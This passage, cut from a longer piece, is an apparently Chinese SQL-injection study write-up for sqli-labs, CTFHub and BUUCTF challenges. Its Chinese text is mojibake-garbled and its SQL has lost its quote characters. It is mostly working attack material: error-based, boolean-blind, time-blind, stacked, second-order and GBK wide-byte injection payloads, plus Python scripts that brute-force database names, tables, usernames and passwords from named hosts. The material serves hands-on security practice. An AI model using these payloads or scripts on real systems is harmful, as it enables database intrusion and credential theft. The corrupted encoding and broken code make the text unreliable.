¼å¼çš„è¯­æ³•ï¼Œconcat()å‡½æ•°ä¸ºå­—ç¬¦ä¸²è¿æ¥å‡½æ•°æ˜¾ç„¶ä¸ç¬¦åˆè§„åˆ™ï¼Œä½†æ˜¯ä¼šå°†æ‹¬å·å†…çš„æ‰§è¡Œç»“æœä»¥é”™è¯¯çš„å½¢å¼æŠ¥å‡ºï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æŠ¥é”™æ³¨å…¥ æ³¨æ„ï¼šåœ¨çˆ†è¡¨ã€åˆ—ã€å€¼çš„æ—¶å€™æ³¨æ„ä¸€æ¬¡æŸ¥è¯¢æœ€é•¿è¾“å‡º32ä½ extractvalueæŠ¥é”™extractvalue()å‡½æ•°çš„ä½¿ç”¨ï¼šä½¿ç”¨XPathè¡¨ç¤ºä»XMLå­—ç¬¦ä¸²ä¸­æå–å€¼ï¼Œä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼å¾—å­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šextractvalueï¼ˆxml_documatï¼ŒXPath_stringï¼‰ å‚æ•°ï¼š1.xml_documatï¼šæ˜¯STRINGæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œè¿™ä¸€é¡¹å¯ä»¥è¾“å…¥ä¸€ä¸ªåå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œæ¯”å¦‚0x26ï¼ˆï¼‰ã€‚ â€‹ 2.XPath_stringï¼šæ˜¯XPathçš„æ ¼å¼çš„å­—ç¬¦ä¸²ï¼ŒæŠ¥é”™æ³¨å…¥æ—¶éœ€è¦å†™å…¥é”™è¯¯çš„æ ¼å¼æ¥æ˜¾ç¤ºé”™è¯¯çš„ä¿¡æ¯ã€‚ æ„é€ æ³¨å…¥è¯­å¥ï¼š select * from major where id=1 and extractvalue(1,concat(0x26,(select database()),0x26)); æ³¨æ„ï¼šextrachtvalue()å‡½æ•°ä¸€æ¬¡åªèƒ½æŸ¥è¯¢32ä½é•¿åº¦ï¼Œåœ¨çˆ†è¡¨ã€åˆ—ã€å€¼çš„æ—¶å€™æ³¨æ„ åŸç†è§£é‡Šï¼šå½“Xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒåŒæ—¶æŠ¥é”™å†…å®¹å«æœ‰é”™è¯¯çš„è·¯å¾„å†…å®¹ã€‚åœ¨updatexml()å‡½æ•°å’Œextractvalue()å‡½æ•°ä¸­ï¼Œéƒ½æ˜¯é€šè¿‡å¯¹ç¬¬äºŒä¸ªå‚æ•°Xpathè¿›è¡Œä¿®æ”¹ï¼Œè¾“å…¥é”™è¯¯çš„æ ¼å¼ï¼Œè¿›è¡ŒæŠ¥é”™å›æ˜¾ï¼Œæ¥è¾¾åˆ°SQLæ³¨å…¥ã€‚ less-5getä¼ å‚ï¼Œæµ‹è¯•åå‘ç°æ˜¯å•å¼•å·åŒ…å«ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•å›æ˜¾ç‚¹å¯ä»¥åˆ©ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè¿™è¾¹æˆ‘æ˜¯ç”¨çš„æ˜¯extractvalueæŠ¥é”™ ?id=-1and extractvalue(1,concat(0x26,(select database()),0x26))--+ï¼šçˆ†åº“ ?id=-1and extractvalue(1,concat(0x26,(select group_concat(table_name) from information_schema.tables where table_schema=security),0x26))--+ï¼šçˆ†å‡ºæ‰€æœ‰è¡¨å ?id=-1and extractvalue(1,concat(0x26,(select group_concat(username,password) from users),0x26))--+ï¼šçˆ†æ•°æ®ï¼Œä½†åªæœ‰32ä½ 1 and extractvalue(1,concat(0x26,(select group_concat(username) from users where username not in(Dumb,Angelina,Dummy,secure)),0x26))--+ï¼šæŠŠå·²çŸ¥çš„æ•°æ®æ’é™¤åœ¨å¤– less-6getä¼ å‚ï¼Œæµ‹è¯•åå‘ç°æ˜¯åŒå¼•å·åŒ…å«ï¼Œç„¶åå°±æŒ‰ç…§less-5åšå°±å¯ä»¥äº† less-13less-14less-13:postä¼ å‚ï¼Œå•å¼•å·åŠ æ‹¬å·é—­åˆ less-14:postä¼ å‚ï¼ŒåŒå¼•å·é—­åˆ CTFHubæŠ¥é”™æ³¨å…¥å‰é¢æ­¥éª¤éƒ½ä¸€æ ·ï¼Œå°±æ˜¯æœ€åçˆ†å‡ºæ¥çš„flagä¸å…¨ï¼Œæ‰€ä»¥è¦ä½¿ç”¨ä»å³å¾€å·¦æŸ¥çœ‹å‡½æ•°rightæˆ–è€…ç”¨ not inæŠŠæŸ¥è¯¢åˆ°çš„æ’é™¤åœ¨å¤– 1 and extractvalue(1,concat(0x26,(select right(group_concat(flag),32) from flag),0x26)) less-17é€šè¿‡æŸ¥çœ‹æºä»£ç å‘ç°è¾“å…¥çš„è´¦å·åä¼šè¢«ä¸€ä¸ªå‡½æ•°æ£€æŸ¥ï¼Œæ‰€ä»¥ä¸èƒ½ä»è´¦å·åå¤„è¿›è¡Œæ³¨å…¥æ“ä½œï¼Œç»§ç»­æŸ¥çœ‹æºä»£ç å‘ç°å¯ä»¥ä»å¯†ç å¤„å…¥æ‰‹ @$sql=SELECT username, password FROM users WHERE username= $uname LIMIT 0,1;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row;\tif($row) //echo font color= #0000ff; $row1 = $row[username]; //echo Your Login name:. $row1; $update=UPDATE users SET password = $passwd WHERE username=$row1; mysql_query($update); echo br; å³ä» $updateå¤„è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œå•å¼•å·é—­åˆï¼Œå‰©ä¸‹çš„æ“ä½œä¸å¿…å¤šè¯´ uname=adminpasswd=1 and extractvalue(1,concat(0x26,(select database()),0x26))# less-18$sql=SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1;\t$result1 = mysql_query($sql);\t$row1 = mysql_fetch_array($result1); if($row1) echo font color= #FFFF00 font size = 3 ; $insert=INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ($uagent, $IP, $uname); mysql_query($insert); //echo Your IP ADDRESS is: .$IP; echo /font; //echo br; echo font color= #0000ff font size = 3 ; echo Your User Agent is: .$uagent; echo /font; é€šè¿‡æºä»£ç å‘ç°ç”¨æˆ·åå’Œå¯†ç éƒ½æœ‰å¼ºçƒˆçš„è¿‡æ»¤ï¼Œç™»å½•æˆåŠŸåä¼šå›æ˜¾ user-agentï¼Œæ‰€ä»¥è¦åˆ©ç”¨å…¶insertè¯­å¥æ¥è¿›è¡Œæ³¨å…¥ï¼Œæ³¨å…¥ 2 ä¸ªè¿ç»­çš„å•å¼•å·ï¼Œå‘ç°é—­åˆæˆåŠŸï¼Œç”±æ­¤å¯è§ 2 ä¸ªå•å¼•å·åˆ†åˆ«é—­åˆäº† 2 ä¾§çš„å•å¼•å· postè¯­å¥ï¼šuname=admin1passwd=admin1ï¼Œéœ€è¦æˆåŠŸç™»å½•æ‰å¯ä»¥ åœ¨æ³¨å…¥çš„ä¸¤ä¸ªå•å¼•å·ä¹‹é—´å¯ä»¥æ’å…¥å…¶ä»– Sql è¯­å¥ï¼Œæ³¨æ„ä½¿ç”¨å•å¼•å·é—­åˆä¸¤ä¾§çš„ Sql è¯­å¥æ—¶ï¼Œç›¸å½“äºæŠŠå®ƒåˆ†å‰²æˆäº† 2 éƒ¨åˆ†ï¼Œæ’å…¥ è¦ç”¨ OR è¿›è¡Œè¿æ¥ï¼šor extractvalue(1,concat(0x26,(select database()),0x26)) or less-19æˆåŠŸç™»é™†åå›æ˜¾refereï¼Œåœ¨é‚£ä¸Šé¢è¿›è¡Œæ³¨å…¥ï¼Œå‰©ä¸‹æ­¥éª¤ä¸less-18çš„ä¸€æ¨¡ä¸€æ · å¸ƒå°”ç›²æ³¨CTFHubgetä¼ å‚ï¼Œæ•´å‹æ³¨å…¥ï¼Œè¾“å…¥æ­£ç¡®ä¼šè¿”å› query success id=1 and (length(database())3) ï¼šé€šè¿‡è¿™ä¸ªåˆ¤æ–­å‡ºæ•°æ®åº“é•¿åº¦ä¸º4 é€šè¿‡ä¸‹é¢åˆ¤æ–­å‡ºæ•°æ®åº“çš„æ­£ç¡®åç§°ä¸ºsqli id=1 and (ascii(substr(database(),1,1))110)1 and (ascii(substr(database(),2,1))=113) 1 and (ascii(substr(database(),3,1))=108) 1 and (ascii(substr(database(),4,1))=105) é€šè¿‡ä¸‹é¢åˆ¤æ–­å‡ºæ•°æ®åº“é‡Œé¢å­˜åœ¨ä¸¤ä¸ªè¡¨ï¼ˆå¤§äº0è¯´æ˜å­˜åœ¨è¡¨ï¼‰ 1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))01 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))0 æµ‹å‡ºè¡¨çš„é•¿åº¦éƒ½ä¸º4 1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=41 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=4 ç„¶åé€šè¿‡åŒæ ·çš„æ–¹æ³•åˆ¤æ–­å‡ºç¬¬ä¸€ä¸ªè¡¨åï¼Œç¬¬äºŒä¸ªè¡¨åflag 1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=110 æŸ¥å‡ºflagè¡¨çš„å­—æ®µæ•°æ˜¯1 1 and (select count(column_name) from information_schema.columns where table_name=flag)=1 åˆ¤æ–­å‡ºè¡¨åé•¿åº¦ä¸º4ï¼Œæµ‹è¯•å‡ºå­—æ®µåä¸ºflag 1 and (select count(flag) from flag)=1ï¼šåˆ¤æ–­è¯¥å­—æ®µæœ‰å‡ è¡Œ 1 and ascii(substr((select flag from flag limit 0,1), 32,1)) ï¼šè§£å‡ºflag import requestsurlOPEN = http://challenge-eb0855b296d32f7a.sandbox.ctfhub.com:10800/?id=mark = query_successdef database_name(): name = for j in range(1,5): for i in qwertyuiopasdfghjklzxcvbnm: url = urlOPEN + if(substr(database(),%d,1)=%s,1,(select table_name from information_schema.tables)) % (j, i) r = requests.get(url) if mark in r.text: name = name + i print(name) break print(database_name,name)database_name()//çˆ†å‡ºæ•°æ®åº“ less-8çˆ†å‡ºæ•°æ®åº“åï¼š import requestsurlOPEN = http://124.70.99.199:81/Less-8/def database_name(): db_name = for i in range(1, 9): for k in qwertyuiopasdfghjklzxcvbnm: payload = urlOPEN + ?id=1and substr(database(),%d,1)=%s--+ % (i, k) res = requests.get(payload) if You are in........... in res.text: db_name += k print(db_name) break print(æ•°æ®åº“ä¸º: %s % db_name)database_name() çˆ†å‡ºæ•°æ®åº“ä¸‹é¢æœ‰4å¼ è¡¨ï¼š import requestsurlOPEN = http://124.70.99.199:81/Less-8/tab_num = 0while True: payload = urlOPEN + ?id=1and (select count(table_name) from information_schema.tables where table_schema=security)=%d--+ % tab_num res = requests.get(payload) if You are in........... in res.text: print(æ•°æ®åº“å…±æœ‰ + str(tab_num) + å¼ è¡¨) break else: tab_num += 1 çˆ†å‡ºè¡¨çš„é•¿åº¦å’Œåå­—ï¼š import requestsurlOPEN = http://124.70.99.199:81/Less-8/for i in range(1, 5): tab_len = 0 while True: payload = urlOPEN + ?id=1and (select length(table_name) from information_schema.tables where table_schema=security limit %d,1)=%d--+ % (i - 1, tab_len) res = requests.get(payload) if You are in........... in res.text: print (ç¬¬%då¼ è¡¨é•¿åº¦ä¸º:%i+str(tab_len)) break if tab_len == 30: print(error!) break tab_len += 1 tab_name = for j in range(1, tab_len + 1): for m in qwertyuiopasdfghjklzxcvbnm: payload = urlOPEN + ?id=1and substr((select table_name from information_schema.tables where table_schema=security limit %d,1),%d,1)=%s--+ % (i - 1, j, m) res = requests.get(payload) if You are in........... in res.text: tab_name += m # print (tab_name) print([-]ç¬¬%då¼ è¡¨åä¸º: %s % (i, tab_name)) çˆ†ç ´å­—æ®µæ•°å’Œå­—æ®µåçš„è„šæœ¬å’Œä¸Šé¢ç±»ä¼¼ çˆ†ç ´usersè¡¨ä¸‹çš„uesrnameå­—æ®µï¼š import requestsurlOPEN = http://124.70.99.199:81/Less-8/usn_num = 0char = qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_-while True: payload = urlOPEN + ?id=1and (select count(username) from security.users)=%d--+ % usn_num res = requests.get(payload) if You are in in res.text: print(usn_num) break usn_num += 1for i in range(1, usn_num + 1): usn_len = 0 while True: payload = urlOPEN + ?id=1and (select length(username) from security.users limit %d,1)=%d--+ % (i - 1, usn_len) res = requests.get(payload) if You are in in res.text: print(ç¬¬%dçš„é•¿åº¦ä¸º%d%(i,usn_len)) break usn_len += 1 usr_name = for k in range(1, usn_len + 1): for m in char: payload = urlOPEN + ?id=1and substr((select username from security.users limit %d,1),%d,1)=%s--+ % (i - 1, k, m) res = requests.get(payload) if You are in in res.text: usr_name += m break print(usr_name) çˆ†ç ´usesè¡¨ä¸‹çš„passwordå­—æ®µå’Œä¸Šé¢ç±»ä¼¼ å¦‚æœè„šæœ¬è¿˜æœ‰ä¸æ‡‚å¯ä»¥ç‚¹å‡»[è¿™é‡Œ](sqli-labs_less8å¸ƒå°”ç›²æ³¨è„šæœ¬_sqlilab less8ç›²æ³¨è„šæœ¬-CSDNåšå®¢) æ—¶é—´æ³¨å…¥æ—¶é—´æ³¨å…¥æ˜¯åˆ©ç”¨sleep()æˆ–è€…benchmark()ç­‰å‡½æ•°è®©MySQLçš„æ‰§è¡Œæ—¶é—´å˜é•¿ï¼Œé€šè¿‡æ—¶é—´çš„æ”¹å˜æ¥åˆ¤æ–­ç»“æœ æ¨¡æ¿è¯­å¥ï¼šif(length(database())1,sleep(3),1) æ„æ€å°±æ˜¯ï¼Œå¦‚æœæ•°æ®åº“åº“åçš„é•¿åº¦å¤§äº1ï¼Œåˆ™MySQLæŸ¥è¯¢ä¼‘çœ 3ç§’ï¼Œå¦åˆ™æŸ¥è¯¢1ã€‚æŸ¥è¯¢1çš„ç»“æœå¤§çº¦ä¸€èˆ¬åªæœ‰å‡ åæ¯«ç§’ï¼Œæ ¹æ®ç½‘é¡µçš„å“åº”æ—¶é—´ï¼Œå°±å¯ä»¥åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡® è¯­æ³•ï¼šif(expr1ï¼Œexpr2ï¼Œexpr3)è¯­æ³•å«ä¹‰ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™if()çš„è¿”å›å€¼ä¸ºexpr2ï¼Œå¦åˆ™è¿”å›å€¼åˆ™ä¸ºexpr3 1 and if(length(database())=4,sleep(3),1)ï¼šæŸ¥è¯¢æ•°æ®åº“é•¿åº¦ æ¥ä¸‹æ¥çš„æ­¥éª¤å°±æ˜¯æŠŠ length(database()=4)è¿›è¡Œæ›´æ¢ï¼Œè·Ÿæ‰‹åŠ¨å¸ƒå°”ç›²æ³¨å·®ä¸å¤š less-9?id=1 and if(length(database())=8,sleep(3),1) --+ï¼šå¾—å‡ºæ•°æ®åº“é•¿åº¦ä¸º8ï¼Œä¸‹é¢ä¸ºè„šæœ¬çš„æ–¹æ³•ï¼š import requestsimport datetimeurl = http://124.70.99.199:81/Less-9/p1 = abcdefghijklmnopqrstuvwxyzdef database_len(): for i in range(1,10): payload = ?id=1 and if(length(database())%d,sleep(2),0)--+ %i url1 = url + payload time1 =datetime.datetime.now() r=requests.get(url1) time2=datetime.datetime.now() time3 = (time2-time1).total_seconds() if time3 = 2: print(i) else: print(i) break print(æ•°æ®åº“é•¿åº¦ä¸º:,i)database_len() çˆ†å‡ºæ•°æ®åº“åï¼š import requestsimport datetimeurl = http://124.70.99.199:81/Less-9/p1 = abcdefghijklmnopqrstuvwxyzdef database_name(): name= for i in range(1,9): for j in p1: payload=?id=1 and if(substr(database(),%s,1)=%s,sleep(4),1)--+ %(i,j) url1=url+payload time1=datetime.datetime.now() r=requests.get(url1) time2=datetime.datetime.now() time3=(time2-time1).total_seconds() if time3 = 4: name += j print(name) break print(æ•°æ®åº“åå­—ä¸º:,name)database_name() ?id=1 and if(length((select table_name from information_schema.tables where table_schema=security limit 3,1))0,sleep(3),1) --+ï¼šå¾—åˆ°æ•°æ®åº“ä¸‹é¢æœ‰4å¼ è¡¨ çˆ†ç ´è¡¨çš„é•¿åº¦å¯è§é¢˜ç›®less-8 çˆ†ç ´è¡¨çš„åå­—ï¼š import requestsimport datetimeurl = http://124.70.99.199:81/Less-9/p1 = abcdefghijklmnopqrstuvwxyzdef tables_name(): global table4 table1= table2= table3= table4= for i in range(4): for j in range(1,6): for t in p1: payload=?id=1 and sleep(if((substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1)=%s),3,0)) --+%(i,j,t) url1=url+payload time1=datetime.datetime.now() r=requests.get(url1) time2=datetime.datetime.now() time3=(time2-time1).seconds if time3 = 3: if i == 0: table1 +=t print(ç¬¬ä¸€ä¸ªè¡¨ä¸º:,table1) elif i == 1: table2 += t print(ç¬¬äºŒä¸ªè¡¨ä¸ºï¼š,table2) elif i == 2: table3 +=t print(ç¬¬ä¸‰ä¸ªè¡¨ä¸ºï¼š,table3) elif i == 3: table4 += t print(ç¬¬å››ä¸ªè¡¨ä¸ºï¼š,table4) else: break print(ç¬¬ä¸€ä¸ªè¡¨ä¸º+table1) print(ç¬¬äºŒä¸ªè¡¨ä¸º+table2) print(ç¬¬ä¸‰ä¸ªè¡¨ä¸º + table3) print(ç¬¬å››ä¸ªè¡¨ä¸º + table4)tables_name() çˆ†ç ´å­—æ®µæ•°ï¼Œé•¿åº¦ï¼Œåå­—çš„è„šæœ¬ç±»ä¼¼ çˆ†ç ´ä¸€è¡Œçš„å­—æ®µå†…å®¹ï¼ˆå¯ä»¥é€šè¿‡æ›´æ”¹ limit 0,1æ¥æ›´æ”¹çˆ†ç ´åœ°æ–¹ï¼Œå¯ä»¥å»çœ‹less-8çš„çˆ†ç ´ï¼‰ï¼š import requestsimport datetimeurl = http://124.70.99.199:81/Less-9/p1 = abcdefghijklmnopqrstuvwxyzdef s_content(): content1= for i in range(20): for t in p1: payload = ?id=1 and sleep(if((substr((select password from users limit 0,1),%s,1)=%s ),3,0)) --+%(i,t) url1 =url+payload time1=datetime.datetime.now() r = requests.get(url1) time2 = datetime.datetime.now() time3 = (time2-time1).seconds if time3 =3: content1 += t print(passwordå­—æ®µä¸€å†…å®¹ä¸ºï¼š+content1) break print(å­—æ®µå†…å®¹ä¸ºï¼š+content1)s_content() less-10åŒå¼•å·é—­åˆï¼Œå‰©ä¸‹çš„å’Œless-9ä¸€æ · less-15(postä¼ å‚è„šæœ¬)less-16æ³¨æ„ï¼šè¯¥é¢˜é€»è¾‘è¿ç®—ç¬¦è¦ç”¨or é€šè¿‡ä¸‡èƒ½å¯†é’¥ 1 or 1=1çœ‹åˆ°äº†æˆåŠŸç™»å½•æ—¶çš„å›¾ç‰‡ uname=1 or length(database())=8#passwd=1æ•°æ®åº“é•¿åº¦ä¸º8 sql-labs-less15less16|SQLæ³¨å…¥|è„šæœ¬æ—¶é—´æ³¨å…¥-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com) çˆ†ç ´æ•°æ®åº“åå­— import requestsimport datetimeurl = http://124.70.99.199:81/Less-15/def get_dbname(): db_name = for i in range(1,9): for k in range(32,127): database_payload = uname:admin and if(ascii(substr(database(),%d,1))=%d,sleep(2),1)#%(i,k),passwd:1 time1 = datetime.datetime.now() res = requests.post(url,database_payload) time2 = datetime.datetime.now() difference = (time2-time1).seconds if difference 1: db_name += chr(k) print(æ•°æ®åº“åä¸º-+db_name)get_dbname() æŸ¥è¡¨å table_payload = uname:admin and if(ascii(substr((select table_name from information_schema.tables where table_schema=\\security\\ limit %d,1),%d,1))=%d,sleep(2),1)#%(i,j,k),passwd:1å¯ä»¥è¿™ä¹ˆå†™ less-16ï¼šPostä¼ å‚ï¼ŒåŒå¼•å·åŠ æ‹¬å·é—­åˆ å †å æ³¨å…¥å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œå¤šè¯­å¥ä¹‹é—´å¯ä»¥ä»¥åˆ†å·éš”å¼€ã€‚å †å æŸ¥è¯¢æ³¨å…¥å°±æ˜¯åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œåœ¨ç¬¬äºŒä¸ªSQLè¯­å¥ä¸­æ„é€ è‡ªå·±è¦æ‰§è¡Œçš„è¯­å¥ã€‚ @å †å æŸ¥è¯¢æ³¨å…¥æ¨¡æ¿è¯­å¥ï¼š 1;select * from major;# SQLé¢„å¤„ç†ï¼ˆPrepareï¼‰ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„SQLå¤„ç†æ–¹å¼ï¼›é¢„å¤„ç†ä¸ä¼šç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œè€Œæ˜¯å…ˆå°†SQLè¯­å¥ç¼–è¯‘ï¼Œç”Ÿæˆæ‰§è¡Œè®¡åˆ’ï¼Œç„¶åé€šè¿‡Executeå‘½ä»¤æºå¸¦SQLå‚æ•°æ¥æ‰§è¡ŒSQLè¯­å¥ã€‚ é¢„å®šä¹‰prepareæ¨¡æ¿ï¼š prepare xxx as select * from user where id=1; //å°†selectæŸ¥è¯¢è¯­å¥å®šä¹‰ä¸ºxxxexecute xxx; //å†ä½¿ç”¨executeæ¥æ‰§è¡Œè¿™ä¸ªå˜é‡xxxå³å¯æ‰§è¡Œä¸Šè¯‰çš„selectæŸ¥è¯¢è¯­å¥ setæ˜¯SQL Serverä¸­å¯¹å·²ç»å®šä¹‰çš„å˜é‡èµ‹å€¼æ–¹å¼ BUUCTF [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨å•å¼•å·åŒ…å«ï¼Œå­—æ®µæ•°ä¸º2 return preg_match(/select|update|delete|drop|insert|where|\\./i,$inject);ï¼šä¸€äº›å…³é”®è¯è¢«è¿‡æ»¤æ‰äº† 0;show databases;--+ï¼šæ˜¾ç¤ºå‡ºæ‰€æœ‰æ•°æ®åº“å 0;show tables;--+ï¼šæ˜¾ç¤ºå‡ºæ‰€æœ‰è¡¨å 0;desc `1919810931114514`;--+ï¼šæ˜¾ç¤ºå‡ºè¡¨çš„å­—æ®µå å‘ç°æœ‰ä¸ªå­—æ®µæ˜¯flagï¼Œäºæ˜¯ç”¨é¢„å®šä¹‰è¯­å¥æ¥æŸ¥è¯¢flagå­—æ®µ 0;sEt@a=concat(sel,ect flag from `1919810931114514`);PRepare hello from @a;execute hello;--+ äºŒæ¬¡æ³¨å…¥BUUCTF [RCTF 2015]EasySQLåœ¨å¸å·å¤„è¾“å…¥ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œç„¶åå»æ›´æ”¹å¯†ç ï¼Œå¯ä»¥æµ‹å‡ºæ˜¯åŒå¼•å·é—­åˆï¼Œä¼šè¿”å›æŠ¥é”™è¯­å¥ï¼Œå¯ä»¥åˆ¤å®šæ˜¯å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™å†™å…¥ï¼Œç„¶åå†ä¿®æ”¹å¯†ç çš„åœ°æ–¹ä¿®æ”¹å¯†ç åè§¦å‘ï¼Œè¿™æ ·å°±å¯¼è‡´é”™è¯¯çš„è¾“å‡ºï¼Œè¿™é‡Œæœ‰é”™è¯¯çš„å›æ˜¾å°±å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ¥è¿›è¡Œæ³¨å…¥ è¿‡æ»¤æ‰äº†å¾ˆå¤šçš„å­—ç¬¦ æ¨æµ‹çš„æŸ¥è¯¢è¯­å¥ä¸º select * from è¡¨å where id=%s and pwd=å¯†ç  1||updatexml(1,concat(0x7e,(select(database())),0x7e),1)#ï¼šæŸ¥è¯¢å‡ºæ•°æ®åº“ åé¢æ“ä½œå°±æ˜¯æŠ¥é”™æ³¨å…¥äº† 1||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(^f))),1))#:WHERE real_flag_1s_here REGEXP ^f è¡¨ç¤ºç­›é€‰å‡º real_flag_1s_here åˆ—å€¼ä»¥å­—æ¯ â€˜fâ€™ å¼€å¤´çš„è¡Œã€‚REGEXP æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ“ä½œç¬¦ï¼Œâ€™^â€™ è¡¨ç¤ºåŒ¹é…è¡Œé¦–ï¼ˆä¸è¿™æ ·å­çš„è¯æ•°æ®æ˜¯ä¸€å †XXXXXXXï¼‰ 1||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(^f)))),1))#ï¼šè·å¾—åˆ°å‰©ä¸‹çš„flagï¼Œä¸è¿‡æ˜¯åç€çš„ less-24æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œåªèƒ½åšåˆ°å¯ä»¥ä¿®æ”¹adminå¯†ç çš„ç¨‹åº¦ï¼Œç½‘ä¸Šé¢˜è§£ä¹Ÿå°±åˆ°è¿™ä¸ªç¨‹åº¦ Cookieæ³¨å…¥å°±æ˜¯æ³¨å…¥çš„åœ°æ–¹å˜æˆäº†cookie CTFHUB Web SQL Cookieæ³¨å…¥åšè¿™ç§é¢˜ç›®æœ€å¥½ç”¨bpæŠ“åŒ…ä¸è¦ç›´æ¥ç”¨hackbarï¼Œä¸å¥½ç”¨ï¼Œæ“ä½œè·Ÿunionæ³¨å…¥çš„ä¸€æ · å®½å­—èŠ‚æ³¨å…¥å“ªé‡Œå­˜åœ¨è¿™ä¸ªæ³¨å…¥æ¼æ´ ç”±äºæ•°æ®åº“æŸ¥è¯¢å‰æ‰§è¡Œäº†SET NAMES GBKï¼Œå°†ç¼–ç è®¾ç½®ä¸ºå®½å­—èŠ‚GBKï¼Œæ‰€ä»¥æ­¤å¤„æ˜¯å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥æ¼æ´ åœ¨PHPä¸­ï¼Œé€šè¿‡iconv()è¿›è¡Œç¼–ç è½¬æ¢æ—¶ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨å®½å­—ç¬¦æ³¨å…¥æ¼æ´ less-32less-33less-34function check_addslashes($string) $string = preg_replace(/. preg_quote(\\\\) ./, \\\\\\\\\\\\, $string); $string = preg_replace(/\\/i, \\\\\\, $string); $string = preg_replace(/\\/, \\\\\\, $string); return $string;if(isset($_GET[id]))$id=check_addslashes($_GET[id]); è¿™é‡Œé€šè¿‡ä½¿ç”¨id1â€™çš„æŸ¥è¯¢æ–¹å¼å‘ç°ï¼ŒHintä¸­å‘ŠçŸ¥äº†åç«¯å°†æˆ‘ä»¬çš„è¯­å¥è¿›è¡Œäº†\\è½¬ä¹‰ï¼Œå‚æ•°id1åœ¨æ•°æ®åº“æŸ¥è¯¢æ—¶æ˜¯è¢«å•å¼•å·åŒ…å›´çš„ã€‚å½“ä¼ å…¥id1â€™æ—¶ï¼Œä¼ å…¥çš„å•å¼•å·åˆè¢«è½¬ä¹‰ç¬¦ï¼ˆåæ–œçº¿ï¼‰è½¬ä¹‰ï¼Œå¯¼è‡´å‚æ•°IDæ— æ³•é€ƒé€¸å•å¼•å·çš„åŒ…å›´ï¼Œæ‰€ä»¥åœ¨ä¸€èˆ¬çš„æƒ…å†µä¸‹ï¼Œæ­¤å¤„æ˜¯ä¸å­˜åœ¨SQLæ³¨å…¥æ¼æ´çš„ã€‚ä¸è¿‡æœ‰ä¸€ä¸ªç‰¹ä¾‹ï¼Œå°±æ˜¯å½“æ•°æ®åº“çš„ç¼–ç ä¸ºGBKæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå®½å­—èŠ‚çš„æ ¼å¼å°±æ˜¯åœ¨åœ°å€åé¢åŠ ä¸€ä¸ª**%df**ï¼Œå†åŠ å•å¼•å·ï¼Œå¯ä»¥é€šè¿‡ä¸Šé¢çš„æµ‹è¯•å‘ç°ï¼Œåœ¨å•å¼•å·ä¹‹å‰PHPä¼šè‡ªåŠ¨åŠ ä¸€ä¸ª\\ï¼ˆåæ–œæ ï¼‰ï¼Œå› ä¸ºåæ–œæ çš„ç¼–ç ä¸º%5cï¼Œæ‰€ä»¥è‡ªåŠ¨è½¬ä¹‰ä¸º\\ï¼Œè€Œåœ¨GBKç¼–ç ä¸­ï¼Œ%df5cæ˜¯ç¹ä½“å­—â€œé€£â€ï¼Œç”±äºæ±‰å­—æ˜¯åŒå­—èŠ‚ï¼Œæ‰€ä»¥è¿™é‡Œä¹‹å‰çš„\\å°±ä¼šè¢«åƒæ‰æ¶ˆå¤±ï¼Œé‚£ä¹ˆä¼šé€ æˆå•å¼•å·æˆåŠŸé€ƒé€¸ï¼Œçˆ†å‡ºMySQLæ•°æ®åº“çš„é”™è¯¯ ?id=0%dfunion select 1,2,3--+ï¼šå‘ç°å°±å›æ˜¾2ï¼Œ3 ?id=0%dfunion select 1,2,database()--+ï¼šçˆ†æ•°æ®åº“å ?id=0%dfunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())--+ï¼šçˆ†è¡¨å ?id=0%dfunion select 1,2,group_concat(column_name) from information_schema.columns where table_name = (select table_name from information_schema.tables where table_schema = (select database())limit 0,1)--+ï¼šçˆ†ä¸€ä¸ªä¸ªè¡¨çš„å­—æ®µ ?id=0%dfunion select 1,(select group_concat(id) from emails),(select group_concat(email_id) from emails)--+ï¼šçˆ†è¡¨çš„å†…å®¹ 